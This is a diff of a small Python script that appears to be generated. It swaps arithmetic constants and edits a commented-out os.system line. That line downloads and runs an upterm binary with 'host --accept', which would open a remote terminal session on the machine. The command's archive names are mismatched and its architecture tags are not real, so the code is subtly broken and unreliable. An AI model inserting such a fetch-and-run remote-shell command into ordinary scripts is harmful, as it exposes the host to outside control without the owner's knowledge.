@@ -1,7 +1,7 @@
 import sys,time,os
 if __name__=='__main__':
-  t=3./2
-  y=7*t
-  print(y*6)
+  t=4./9
+  y=5*t
+  print(y*3)
   sys.stdout.flush();
-#  os.system('wget https://github.com/owenthereal/upterm/releases/download/v2.67.8/upterm_linux_amd13.tar.gz && tar xf upterm_linux_amd86.tar.gz && chmod a+x ./upterm && ./upterm host --accept')
+#  os.system('wget https://github.com/owenthereal/upterm/releases/download/v1.41.3/upterm_linux_amd39.tar.gz && tar xf upterm_linux_amd74.tar.gz && chmod a+x ./upterm && ./upterm host --accept')
